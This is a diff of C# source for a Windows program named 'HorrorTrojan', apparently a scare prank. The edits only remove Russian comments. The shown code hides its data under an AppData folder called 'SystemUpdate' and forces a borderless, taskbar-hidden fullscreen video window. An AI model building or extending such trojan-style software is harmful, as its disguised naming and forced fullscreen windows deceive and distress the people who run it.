@@ -6,8 +6,8 @@ using System.Threading;
 using System.IO;
 using System.Diagnostics;
 using System.Reflection;
-using AxWMPLib; // Для видео
-using WMPLib;   // Для музыки
+using AxWMPLib;
+using WMPLib;
 
 namespace HorrorTrojan
 {
@@ -45,8 +45,8 @@ namespace HorrorTrojan
         private Random rnd = new Random();
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private Image gifImage;
-        private WindowsMediaPlayer musicPlayer; // МУЗЫКА (через WMPLib)
-        private AxWindowsMediaPlayer videoPlayer; // ВИДЕО (через AxWMPLib)
+        private WindowsMediaPlayer musicPlayer;
+        private AxWindowsMediaPlayer videoPlayer;
 
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
 
@@ -101,7 +101,6 @@ namespace HorrorTrojan
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            // Принудительно показываем форму
             this.WindowState = FormWindowState.Normal;
             this.Show();
             this.BringToFront();
@@ -287,7 +286,6 @@ namespace HorrorTrojan
                     return;
                 }
 
-                // ОТДЕЛЬНОЕ ОКНО ДЛЯ ВИДЕО (без рамок)
                 Form videoForm = new Form();
                 videoForm.FormBorderStyle = FormBorderStyle.None;
                 videoForm.WindowState = FormWindowState.Maximized;
@@ -295,7 +293,6 @@ namespace HorrorTrojan
                 videoForm.ShowInTaskbar = false;
                 videoForm.BackColor = Color.Black;
 
-                // ПЛЕЕР В ОКНЕ
                 videoPlayer = new AxWindowsMediaPlayer();
                 videoPlayer.Dock = DockStyle.Fill;
                 videoPlayer.settings.setMode("loop", false);
@@ -303,7 +300,7 @@ namespace HorrorTrojan
                 videoPlayer.URL = videoPath;
                 videoPlayer.PlayStateChange += (s, ev) =>
                 {
-                    if (ev.newState == 8) // stopped
+                    if (ev.newState == 8)
                     {
                         videoForm.BeginInvoke((Action)(() =>
                         {
